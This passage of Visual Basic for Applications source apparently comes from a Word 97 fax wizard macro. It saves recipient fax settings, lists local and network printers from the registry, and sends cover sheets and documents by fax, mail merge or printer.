    On Error GoTo -1 'reset error trap
    On Error Resume Next
    formWizard.txtCompany.Text = System.PrivateProfileString("", strREGKEY_CMPNY_NAME, strVALKEY_CMPNY_NAME)
    fSettingsRestored = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'sets default merge fields
Public Sub FillMergeFields(fDummy As Boolean)
Dim i As Integer, iCount As Integer
Dim iFirstName As Integer
Dim iLastName As Integer
Dim iFax As Integer
Dim rgstrNames() As String
Dim objFieldNames As MailMergeFieldNames
Dim objTempDoc As Document

    On Error GoTo FatalError
    iFirstName = -1
    iLastName = -1
    iFax = -1
    
    'reset the query options so that all names in the data src are selected
    
    Set objFieldNames = objDataSrc.FieldNames
    iCount = objFieldNames.Count
    ReDim rgstrNames(iCount - 1)
    For i = 1 To iCount
        rgstrNames(i - 1) = objFieldNames(i).Name
        If InStr(rgstrNames(i - 1), strFLD_NAME) Then
            If iFirstName = -1 Then
                iFirstName = i - 1
            ElseIf iLastName = -1 Then
                iLastName = i - 1
            End If
        ElseIf InStr(rgstrNames(i - 1), strFLD_FAX) Then
            If iFax = -1 Then iFax = i - 1
        End If
        
    Next i
    
    formWizard.cboFldsRcpntFirstName.List = rgstrNames
    formWizard.cboFldsRcpntLastName.List = rgstrNames
    formWizard.cboFldsFaxNum.List = rgstrNames
    
    formWizard.cboFldsRcpntFirstName.AddItem strNONE
    formWizard.cboFldsRcpntLastName.AddItem strNONE
    
    If (iFirstName <> -1) Then
        formWizard.cboFldsRcpntFirstName.Value = rgstrNames(iFirstName)
    Else
        formWizard.cboFldsRcpntFirstName.Value = strNONE
    End If
        
    If (iLastName <> -1) Then
        formWizard.cboFldsRcpntLastName.Value = rgstrNames(iLastName)
    Else
        formWizard.cboFldsRcpntLastName.Value = strNONE
    End If
        
    If (iFax <> -1) Then _
        formWizard.cboFldsFaxNum.Value = rgstrNames(iFax)

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'retrieves the Names and numbers stored in registry.
Sub ReadRegistryFaxNames(fDummy As Boolean)
Dim j As Integer, k As Integer
Dim objCtrls As Object
    On Error GoTo FatalError
    fRegistryNamesRead = True
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For j = 1 To iMAX_RCPNTS
        rgstrMRUFaxNames(j - 1) = StrRestorePref(strRCPNT_NAME & j, "")
        rgstrMRUFaxNums(j - 1) = StrRestorePref(strRCPNT_NUMBER & j, "")
    Next j
        
    
    For j = 0 To iMAX_RCPNTS - 1
        objCtrls(strCBO_RCPNT_NAME & j).List = rgstrMRUFaxNames
        objCtrls(strCBO_RCPNT_NUM & j).List = rgstrMRUFaxNums
    Next j
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
Sub SaveDialogValues(fDummy As Boolean)
    On Error GoTo FatalError
    
    StatusBar = strSAVE_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    System.PrivateProfileString("", strREG_SETTINGS_BASE_KEY, strREG_ASSISTANT_TIME_STAMP) = Format$(Now, "General Date")
    StoreValPref strREG_ASSISTANT_HELP, iLocalState
    
    StorePref "Fax Option", CStr(iFaxOption)
    If iFaxOption = iDIFF_FAX Then _
        StorePref "Fax Driver", formWizard.cboFaxDriver.Text
    
    StorePref "Sender Fax", formWizard.txtSenderFax.Text
    StorePref "Sender Phone", formWizard.txtSenderPhone.Text
    StorePref "Coversheet Style", CStr(iFaxStyle)
    
    If Not (fDocIsFormLtr) Then SaveRcpntsInRegistry
    
    fSettingsSaved = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'stores the recipient names and numbers of iMAX_RCPNTS recipients.
'The name is tagged to the number. So, you can have a number without a name
'but not a name without a number
Private Sub SaveRcpntsInRegistry()
'Dim strName As String
Dim strNum As String
Dim i As Integer, j As Integer, k As Integer
Dim objCtrls As Object

    On Error GoTo FatalError
    k = 0
    'initialize the arrays so that even if the user has not
    'chosen any recipient we can still use the first entry of the arrays.
    rgstrRcpntFaxNames(0) = ""
    rgstrRcpntFaxNums(0) = ""
    iNumRcpnts = 0
    
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For i = 0 To iMAX_RCPNTS - 1
        strNum = StrSearchReplace(objCtrls(strCBO_RCPNT_NUM & i).Text, vbTab, " ") 'recipient number
        If (Len(strNum)) Then 'if number not empty
            rgstrRcpntFaxNums(k) = strNum 'store number
            rgstrRcpntFaxNames(k) = StrSearchReplace(objCtrls(strCBO_RCPNT_NAME & i).Text, vbTab, " ") 'and corresponding name
            k = k + 1
            StorePref strRCPNT_NUMBER & k, strNum 'store number
            StorePref strRCPNT_NAME & k, rgstrRcpntFaxNames(k - 1)
 
            j = objCtrls(strCBO_RCPNT_NUM & i).ListIndex
            
            'user selected one of the choices
            If j <> -1 Then rgstrMRUFaxNums(j) = ""  'already picked up this text
        End If
    Next i
    
    iNumRcpnts = k
    
    j = 0
    While (k < iMAX_RCPNTS) 'if we haven't yet iMAX_RCPNTS names
        'go through the array of orginally obtained recipients and
        'store which haven't yet been stored
        While ((j < iMAX_RCPNTS) And (Len(rgstrMRUFaxNums(j)) = 0))
            j = j + 1
        Wend
        
        If j = iMAX_RCPNTS Then
            GoTo LReturn 'no names left to fill
        Else
            k = k + 1
            StorePref strRCPNT_NAME & k, rgstrMRUFaxNames(j) 'store name
            StorePref strRCPNT_NUMBER & k, rgstrMRUFaxNums(j) 'and corresponding number
            rgstrMRUFaxNums(j) = ""
        End If
    Wend

LReturn:
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Error will be taken care of in SetupDocForFax
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean)
Dim i As Integer
Dim objVars As Variables
Dim strTemp As String, strFaxFld As String

    Set objVars = ActiveDocument.Variables
    objVars.Add strNUM_RCPNTS, iNumRcpnts
    
    If fSaveRcpnts Then
        If (iNumRcpnts > 0) Then
            For i = 1 To iNumRcpnts
                objVars.Add strRCPNT_NAME & i, rgstrRcpntFaxNames(i - 1)
                objVars.Add strRCPNT_NUMBER & i, rgstrRcpntFaxNums(i - 1)
            Next i
        End If
    End If
    
    If (fNoCovSht) Then
        objVars.Add "Cover Sheet Present", "0"
    Else
        objVars.Add "Cover Sheet Present", "1"
    End If
    
    strFaxFld = " "
    'store what fax option user chose.
    If (iFaxOption = iDIFF_FAX) Then
        objVars.Add "MS Fax Present", "0"
        objVars.Add "Fax Printer", formWizard.cboFaxDriver.Text
    Else
        objVars.Add "MS Fax Present", "1"
        If fDocIsFormLtr Then
            strFaxFld = formWizard.cboFldsFaxNum.Value
        Else
            strFaxFld = strFLD_FAX_NUMBER
        End If
    End If
    
    objVars.Add "Fax Field Name", strFaxFld

    'if doc. is present and is to be faxed then store relevant info. about doc.
    If (fDocPresent And (Not (formWizard.optCovSht.Value))) Then
        objVars.Add "Main Doc Present", "1"
        objVars.Add "Main Document Name", objMainDoc.Name
        
        'is the field a fax number or an Address Book Entry???
        If (fDocIsFormLtr) Then objVars.Add "Through Email", _
                formWizard.optFldFaxEntry.Value

    Else
        
        objVars.Add "Main Doc Present", "0"
    
    End If
    
End Sub


'removes vbCR & vbLF from the end of the string
'until the last character is not a vbLf or vbCr
Public Function StrRemoveCrLfFromEnd(strText As String) As String
    Dim strChar As String
    Dim i As Integer

    i = Len(strText)
    If (i = 0) Then GoTo LEnd

    strChar = Mid$(strText, i, 1)
    'check for the last character
    While (strChar = vbLf) Or (strChar = vbCr)
        i = i - 1
        strChar = Mid$(strText, i, 1)
    Wend
    
LEnd:
    StrRemoveCrLfFromEnd = Left$(strText, i)
End Function
'counts the number of lines in a string
Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer) As Integer
    Dim cLines As Integer, iPos As Integer
    
    strNewText = ""
    cLines = 0
    iPos = InStr(strWhat, vbCr)
    While iPos
        If iPos < Len(strWhat) Then
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            cLines = cLines + 1
            strWhat = Mid$(strWhat, iPos + 1)
            iPos = InStr(strWhat, vbCr)
        Else
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            If Len(strWhat) > 1 Then cLines = cLines + 1
            strWhat = ""
            iPos = 0
        End If
    Wend
    If strWhat <> "" Then
        If cLines < iMax Then strNewText = strNewText & strWhat
        cLines = cLines + 1
    End If
    
    ICountLines = cLines

End Function  ' CountLines

'inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng
'so pass a collapsed range always.and updates the range to be at the end
'of the inserted field.
Private Sub InsertField(objRng As Range, iFldType, strText As String, fPreserveFormatting)
    Dim objFld As Field
    
    On Error GoTo FatalError

    Set objFld = objRng.Fields.Add(objRng, iFldType, strText, fPreserveFormatting)
    
    Set objRng = objFld.result
    With objRng
        .Collapse wdCollapseEnd
        .End = .End + 1
        .Start = .End
    End With
    
    Exit Sub
FatalError:
    ReportError Err
    
End Sub
'replaces all occurences of vbCR & vbLF with the delimiter string in strText
'returns the new string
Private Function StrReplaceCrLfWithText(strText As String, strDelim As String) As String
    Dim strRet As String, strTmp As String
    
    strRet = ""
    strTmp = strText
    If Len(strTmp) = 0 Then GoTo LEnd
    
    strRet = StrRemoveCrLfFromEnd(strTmp)
    'remove vbLf thro' search and replace
    strTmp = StrSearchReplace(strRet, vbLf, "")
    'now replace all occurrences of vbCr with strDelim
    strRet = StrSearchReplace(strTmp, vbCr, strDelim)
LEnd:
    StrReplaceCrLfWithText = strRet

End Function

'removes the character strSrch from strText.
'caller should make sure that strSrch is a one character string
'returns the string stripped off the character
Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String)
    Dim strRet As String, strTmp As String
    Dim iPos As Integer
    
    strRet = ""
    strTmp = strText

    iPos = InStr(strTmp, strSrch)
    
    While (iPos) 'presence of strChar
        strRet = strRet & Left$(strTmp, iPos - 1)
        If (iPos < Len(strTmp)) Then
            strRet = strRet & strReplace
            strTmp = Mid$(strTmp, iPos + 1)
            iPos = InStr(strTmp, strSrch)
        Else 'strSrch is the last character
            strTmp = ""
            iPos = 0
        End If
    Wend
        
    'append whatever is left of the original string
    strRet = strRet & strTmp

    StrSearchReplace = strRet
End Function

'Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back
'this function
Public Sub SetupDocForFax(fDummy As Boolean)
    On Error GoTo FatalError

    If iFaxOption = iNO_FAX Then Exit Sub

    If (Not (fDocIsFormLtr)) And (iNumRcpnts = 0) And (iFaxOption = iMS_FAX) _
            Then Exit Sub
        
    'dont save recipient info for form letter
    SaveRcpntsInDocVars (Not (fDocIsFormLtr))
    
    If (fNoCovSht) Then 'fax the doc.
        If (Not (fDocIsFormLtr)) Then
            FaxRegDoc
        Else
            FaxFormLtr
        End If
    Else
        CreateCmdBar
    End If

    Exit Sub
FatalError:
    DisplayErrorMsg strERR_CREATING_CMDBAR
    ReportError Err
End Sub
'Error will be taken care of in SetupDocForFax
Private Sub CreateCmdBar()
Dim objCmdBar As CommandBar
Dim objBtn As CommandBarButton

    Application.CustomizationContext = ActiveDocument
    Set objCmdBar = Application.CommandBars.Add(strCMD_BAR_TITLE, Position:=msoBarFloating, Temporary:=True)

    'Add a button
    Set objBtn = objCmdBar.Controls.Add(msoControlButton, Temporary:=True)
    objBtn.Style = msoButtonCaption
    objBtn.Caption = strCMD_BTN_TEXT
    
    If (Not (fDocIsFormLtr)) Then
        objBtn.OnAction = "Fax.FaxRegDoc"
    Else
        objBtn.OnAction = "Fax.FaxFormLtr"
    End If
    
    objCmdBar.Visible = True
    
    fCreatedCmdBar = True
    Exit Sub

End Sub

'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxRegDoc()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim iNumRcpnts As Integer
Dim rgstrFaxNames(iMAX_RCPNTS) As String
Dim rgstrFaxNums(iMAX_RCPNTS) As String
Dim i As Integer
Dim strDocName As String
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String
Dim fSendMailAttach As Boolean


    On Error GoTo FatalError
    strErrorMsg = strERR_SEND_FAX
    fSendMailAttach = Application.Options.SendMailAttach
    
    Set objVars = ActiveDocument.Variables
    
    iNumRcpnts = Val(objVars(strNUM_RCPNTS).Value)
    
    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
          
    For i = 1 To iNumRcpnts
        rgstrFaxNames(i - 1) = objVars(strRCPNT_NAME & i).Value
        rgstrFaxNums(i - 1) = objVars(strRCPNT_NUMBER & i).Value
    Next i
    
    'if nonMSFax, then set the Fax driver to be the current printer
    If (Not (fMSFax)) Then
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
     End If
    
    'fax the cover sheet first
    If (fCovSht) Then
        If (iNumRcpnts > 1) Then
            Set objTmpMM = ActiveDocument.MailMerge
            If fMSFax Then
                objTmpMM.Destination = wdSendToFax
                'MsgBox "MailMerging the cover sheet"
            Else 'non MS fax
                objTmpMM.Destination = wdSendToPrinter
            End If
            objTmpMM.MailAsAttachment = True
            objTmpMM.MailAddressFieldName = strFaxFld
            StatusBar = strFAXING_CS_RECIPIENTS
            objTmpMM.Execute
            
        ElseIf (iNumRcpnts = 1) And fMSFax Then
            StatusBar = strFAXING_CS_TO & " " & rgstrFaxNums(0) & "..."
            Application.Options.SendMailAttach = True
            ActiveDocument.SendFax rgstrFaxNums(0)
                'MsgBox "Faxing to  " & rgstrFaxNames(0) & rgstrFaxNums(0)
        Else 'non MS fax
            StatusBar = strFAXING_CS_RECIPIENT & "..."
            ActiveDocument.PrintOut
        End If
    End If
    
    If fMainDocPresent = 0 Then GoTo LResetPrinter 'if no main doc. then deesh
    
    If (iNumRcpnts = 0) And Not (fMSFax) Then objMainDoc.PrintOut
    
    'send the main doc.
    If fMSFax Then Application.Options.SendMailAttach = True
    For i = 0 To iNumRcpnts - 1
        If fMSFax Then
            StatusBar = strFAXING_DOC_TO & " " & rgstrFaxNums(i)
            objMainDoc.SendFax rgstrFaxNums(i)
            'MsgBox "Faxing to  " & rgstrFaxNames(i) & rgstrFaxNums(i)
        Else
            StatusBar = strFAXING_DOC_RECIPIENT & " " & CStr(i + 1) & "..."
            objMainDoc.PrintOut
        End If
        
    Next i
    
LResetPrinter:
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
    DisplayTip strErrorMsg
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxFormLtr()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim i As Integer
Dim strDocName As String
Dim iDestination As Long
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String

    On Error GoTo FatalError

    strErrorMsg = strERR_SEND_FAX
    Set objVars = ActiveDocument.Variables

    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
    
    If fMSFax Then
        If Val(objVars("Through Email").Value) Then
            iDestination = wdSendToEmail
        Else
            iDestination = wdSendToFax
        End If
    Else
        iDestination = wdSendToPrinter
        'if nonMSFax, then set the Fax driver to be the current printer
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
    End If
    
    'send the coversheet first
    If (fCovSht) Then
        Set objTmpMM = ActiveDocument.MailMerge
        objTmpMM.Destination = iDestination 'MsgBox "MailMerging activdoc (coversheet) "
        objTmpMM.MailAddressFieldName = strFaxFld
        objTmpMM.MailAsAttachment = True
        StatusBar = strFAXING_CS_RECIPIENTS
        objTmpMM.Execute
    End If
 
    If fMainDocPresent = 0 Then GoTo LResetPrinter
    
    'fax the main document
    Set objTmpMM = objMainDoc.MailMerge
    objTmpMM.Destination = iDestination
    objTmpMM.MailAddressFieldName = strFaxFld
    objTmpMM.MailAsAttachment = True
    StatusBar = strFAXING_DOC_RECIPIENTS
    objTmpMM.Execute
    'MsgBox "MailMerging main doc."

LResetPrinter:
'reset printer for non MS fax
    ActiveDocument.Fields.Update
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
        
    DisplayTip strErrorMsg
    
'reset printer for non MS fax
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub

'To display help using help files. Assuming that the help files are present in
'the windows directory
Private Sub DisplayHelp(strFile As String, ByVal lContext As Long)
    Dim iSize As Integer
    Dim strTmpBuffer As String
    Dim j As Integer, i As Integer
    Dim strWinDir As String, strWndName As String
    Dim hOpusWin As Long, lResult As Long
    Dim strMacroName As String
    
    'Get windows directory
    i = 512
    strTmpBuffer = String$(i, 0)
    j = 0
    strWinDir = ""
    j = GetWindowsDirectory(strTmpBuffer, i)
    
    If j Then
        If (j > i) Then j = i
        
        strWinDir = Left$(strTmpBuffer, j)
        If Right$(strWinDir, 1) <> strPathSeparator Then _
            strWinDir = strWinDir & strPathSeparator
    End If
    
    'Find word's window
    strWndName = strMS_WORD
    If ActiveWindow.WindowState = wdWindowStateMaximize Then _
        strWndName = strWndName & " - " & ActiveWindow.Caption
    hOpusWin = FindWindow("OpusApp", strWndName)
    If hOpusWin = 0 Then GoTo LNotFindWindow
    
    'display help
    strMacroName = "JH(" & strQUOTE & strQUOTE & " , " & lContext & ")"
    lResult = WinHelp(hOpusWin, strWinDir & strFile, HELP_COMMAND, strMacroName)
    
LNotFindWindow:
End Sub
'displays a tip during post-wizard options
'assumes that Assistant is present since it is called from post-wizard balloon
Private Sub DisplayTip(strTip As String)
    Dim objBlnTip As Balloon
    On Error GoTo FatalError
    
    Set objBlnTip = Assistant.NewBalloon
    
    With objBlnTip
        .Mode = msoModeModal
        .Heading = strWizName
        .Text = strTip
        .Button = msoButtonSetOK
    End With
    objBlnTip.Show
    
    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo FatalError

    Exit Sub

FatalError:
    Err.Clear
    'MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName
End Sub
'ROUTINES TO OBTAIN PRINTERS FROM REGISTRY
'fills rgstrPrinterNames with the local and remote printer names obtained
'from the registry. iTotalNumPrinters has the number of printer
'names obtained.
Sub GetAllPrinters()
Dim i As Integer

    iTotalNumPrinters = 0
    
    GetLocalPrinters
    GetRemotePrinters
    
    If (iTotalNumPrinters > 0) Then
        ReDim Preserve rgstrPrinterNames(iTotalNumPrinters - 1)
        formWizard.cboFaxDriver.List = rgstrPrinterNames
        formWizard.cboFaxDriver.ListIndex = 0
    End If
    'if no printers, then the user can use cmdOtherPrinters to select one
    'if we failed to enumerate some printer
    
End Sub
Sub GetRemotePrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub
    
    GetRemotePrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetProviderPrinters(strProvider As String)
Dim hr As Long
Dim hKeyProviderServers As Long
Dim lpPrinterServer As String, strPrinterServer As String
Dim cbPrinterServer As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterServer As Integer

    cbPrinterServer = 256
    lpPrinterServer = String$(cbPrinterServer, 0)
    dwPrinterIndex = 0


    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS & strProvider & "\Servers", hKeyProviderServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterServer = String$(cbPrinterServer, 0)
        
        hr = RegEnumKey(hKeyProviderServers, dwPrinterIndex, lpPrinterServer, cbPrinterServer)
        
        If hr <> ERROR_SUCCESS Then GoTo LCloseProviderServersKey
        
        iLenPrinterServer = InStr(lpPrinterServer, Chr$(0))
        If (iLenPrinterServer > 1) Then 'no name
            strPrinterServer = Left$(lpPrinterServer, iLenPrinterServer - 1)
            GetPrinterNamesFromServer strProvider, strPrinterServer
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LCloseProviderServersKey:
    RegCloseKey (hKeyProviderServers)
    
LEndGetProviderPrinters:
End Sub

Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String)
Dim hr As Long
Dim hKeyPrinterServers As Long
Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer
Dim strRegPrinterServers As String


    cbPrinterName = 256
    lpPrinterName = String$(cbPrinterName, 0)
    dwPrinterIndex = 0

    On Error Resume Next
    strRegPrinterServers = strREG_PROVIDERS & strProvider & "\Servers\" & strPrinterServer & "\Printers"
    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strRegPrinterServers, hKeyPrinterServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKeyPrinterServers, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LClosePrinterServersKey
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strRegPrinterServers & "\" & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                rgstrPrinterNames(iTotalNumPrinters) = UCase$("\\" & strPrinterServer & "\" & strPrinterName)
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LClosePrinterServersKey:
    RegCloseKey (hKeyPrinterServers)
    
LEndGetProviderPrinters:

End Sub

Sub GetRemotePrinterNames(hKey As Long)
    Dim dwProviderIndex As Long
    Dim cbProviderName As Long
    Dim lpProviderName As String
    Dim lRet As Long, iLenProviderName  As Integer

    Dim strProviderName As String
  
    cbProviderName = 256
    dwProviderIndex = 0

    lRet = ERROR_SUCCESS
    
    'get the list of providers and call GetProviderPrinters for each provider
    While (lRet = ERROR_SUCCESS)
        lpProviderName = String$(cbProviderName, 0)
        
        lRet = RegEnumKey(hKey, dwProviderIndex, lpProviderName, cbProviderName)
        
        If (lRet <> ERROR_SUCCESS) Then GoTo LEnd
        
        iLenProviderName = InStr(lpProviderName, Chr$(0)) 'length of provider name
        
        If (iLenProviderName > 1) Then
            strProviderName = Left$(lpProviderName, iLenProviderName - 1)
            GetProviderPrinters (strProviderName)
        End If

        dwProviderIndex = dwProviderIndex + 1
    Wend
    
LEnd:

End Sub

Sub GetLocalPrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_LOCAL_PRINTERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub

    GetLocalPrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetLocalPrinterNames(hKey As Long)

Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer

    cbPrinterName = 256
    dwPrinterIndex = 0

    On Error Resume Next
    
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKey, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LEndLocalPrinters
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strREG_LOCAL_PRINTERS & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then 'if valid name, add to list
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                
                rgstrPrinterNames(iTotalNumPrinters) = UCase$(strPrinterName)
                
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
    
LEndLocalPrinters:
End Sub

'displays post wizard tip in an autodown balloon if Assistant is visible
Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean)

    Dim objTipBalloon As Balloon

    On Error GoTo TipError
    If fMsgBox Then
        If Assistant.Visible = False Then GoTo TipError
    End If
    Set objTipBalloon = Assistant.NewBalloon
    With objTipBalloon
        .Mode = msoModeAutoDown
        .Heading = strWizName
        .Button = msoButtonSetNone
        .Text = strTip
    End With
    objTipBalloon.Show

    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo TipError
    
TipError:
    Err.Clear
    If fMsgBox Then MsgBox strTip, vbInformation + vbOKOnly + vbApplicationModal, strWizName
End Sub

Private Function FInvalidMainDoc(objMainDoc As Document, strDocName As String) As Boolean
    On Error GoTo NoDoc
    Set objMainDoc = Application.Documents(strDocName)
    FInvalidMainDoc = False
    Exit Function
NoDoc:
    DisplayErrorMsg strERR_NO_MAIN_DOC1 & strDocName & strERR_NO_MAIN_DOC2
    FInvalidMainDoc = True
End Function

Public Sub DeleteCmdBar(strCmdBarName)
    On Error Resume Next
    Application.CommandBars(strCmdBarName).Delete
    Err.Clear
End Sub


Function GetCurFont(rgn As Range) As Font
    On Error GoTo LError
    If (rgn.Font.Size = 9999999) Then
        If (rgn.Characters(1).Font.Size = 9999999) Then
            Set GetCurFont = ActiveDocument.Styles(rgn.Paragraphs(1).Style).Font
        Else
            Set GetCurFont = rgn.Characters(1).Font
        End If
    Else
        Set GetCurFont = rgn.Font
    End If
    Exit Function
LError:
    MsgBox Err.Description
End Function

'returns the value stored in registry key strId
Public Function StrFetchPref(strId As String) As String
    On Error GoTo LReturnNull
    
    StrFetchPref = System.PrivateProfileString("", strRegSettingsKey, strId)
    Exit Function
LReturnNull:
    StrFetchPref = ""
End Function

'returns the string stored in strId. If empty, returns strDefault
Public Function StrRestorePref(strId As String, strDefault As String) As String
    Dim strTemp As String

    strTemp = StrFetchPref(strId)
    ' If length is 0, it wasn't in regsistry, so use default value
    If Len(strTemp) = 0 Then
        strTemp = strDefault
    ' "~" is a placeholder to allow returning empty strings
    ElseIf strTemp = "~" Then
        strTemp = ""
    End If
    
    StrRestorePref = strTemp
End Function

' --------------------------------------------------------------------------------------
' WORD 97 MINI-WIZARD
' Envelope Wizard Specific Code
' --------------------------------------------------------------------------------------

Option Explicit

' --------------------------------------------------------------------------------------
' DECLARATIONS
